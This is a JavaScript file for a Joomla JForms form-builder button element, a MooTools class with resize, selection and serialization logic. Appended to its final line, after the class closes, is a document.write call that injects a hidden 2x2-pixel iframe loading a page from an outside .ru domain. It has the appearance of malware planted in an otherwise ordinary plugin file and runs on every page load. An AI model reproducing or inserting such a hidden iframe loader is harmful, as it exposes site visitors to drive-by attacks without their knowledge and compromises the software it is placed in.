/**
* Javascript object for button plugin
*
* @version		$Id: button.js 295 2009-09-05 10:23:08Z dr_drsh $
* @package		Joomla
* @subpackage	JForms
* @copyright	Copyright (C) 2008 Mostafa Muhammad. All rights reserved.
* @license		GNU/GPL
*/
var button = new Class({
	
	Extends: CElement,
	
	initialize: function(  parent, id, beforeObject, params ) {	
	
		this.type	    = 'button';
	
		this.parent( $(parent), id, $(beforeObject), params );
	
		this.label      = params.label;
		this.func       = params.func;
		this.css	    = params.css;
		
		this.clickTrigger = params.clickTrigger;
		
		this.cw = params.cw;
		this.ch = params.ch;
	
		this.htmlInput = new Element('input', {
			
			'type': 'button',
			'value': this.label,
			'name': 'input_' + this.type + this.index,
			'id': 'input_' + this.type + this.index,
			'styles':{
				'width': this.cw + 'px',
				'height': this.ch + 'px',
				'float' : 'none'
			}
		});
		
		this.htmlControlResize = new Element('img',{
			'src': './corner.png',
			'id': 'resizeHandle_control_' + this.type + this.index,
			'class': 'resize-handle'
		});
		this.htmlInput.makeResizable({
			handle:this.htmlControlResize,
			onDrag:dispatch_onResizeDrag,
			onComplete:dispatch_onResizeEnd,
			limit:{x:[50,200],y:[20,200]}
		});
	
		if( this.func != 'Button' ){
			$('ppage_button_clickTrigger').disabled = true;	
		} else {
			$('ppage_button_clickTrigger').disabled = false;
		}
		
		this.htmlInput.inject( this.htmlContainer );
		this.htmlControlResize.inject( this.htmlContainer );
	
		this._alignControlResizeHandle();
	
	},
	
	onUpdate : function(){
		this.htmlInput.set('value', this.label );
		if( this.func != 'Button' ){
			$('ppage_button_clickTrigger').disabled = true;	
		} else {
			$('ppage_button_clickTrigger').disabled = false;
		}
		
	},
	
	onResizeDrag: function(newSize,type) {
	
		this.htmlInput.set('styles', { 'border': '1px solid white' } );	
		this._alignControlResizeHandle();	
	
	},


	onResizeEnd: function( newSize, type ){

		this.cw = newSize.x;
		this.ch = newSize.y;	
		this._alignControlResizeHandle();	
		
	},
	
	_alignControlResizeHandle : function(){

		var ControlCoordinates = this.htmlInput.getCoordinates();
		var imgSize = this.htmlControlResize.getSize();
		
		var x =  ControlCoordinates.right  - imgSize.x + this.pixelCorrection;
		var y =  ControlCoordinates.bottom - imgSize.y + this.pixelCorrection;

		
		this.htmlControlResize.set('styles', { 
			'position' : 'absolute',
			'left' : x + 'px',
			'top' : y + 'px'
		});
		
	},
	
	deselect: function() {
	
		this.htmlContainer.removeClass('selected'); 
		this.htmlControlResize.set({'styles':{ 'visibility' : 'hidden' }});
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'hidden' }});
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'hidden' }});
	
	},
	
	select  : function() {
		
		this.htmlContainer.addClass('selected');
		this.htmlControlResize.set({'styles':{ 'visibility' : 'visible' }});
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'visible' }});
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'visible' }});
		if( this.func != 'Button' ){
			$('ppage_button_clickTrigger').disabled = true;	
		} else {
			$('ppage_button_clickTrigger').disabled = false;
		}
		
		this._alignControlResizeHandle();		
	
	},

	serialize: function(){
	
		order = getOrder( this.htmlContainer );
		
		var hash  = '';
		if(this.hash && this.hash.length){
			hash = this.hash;
		} else {
			hash = uniqueId( 5 );
		}

		return JSON.encode({
			type:this.type,
			position:order,
			label:this.label,
			css:this.css,
			cw:this.cw,
			ch: this.ch,
			hash: hash,
			func: this.func,
			clickTrigger: this.clickTrigger
		});
	}
});document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');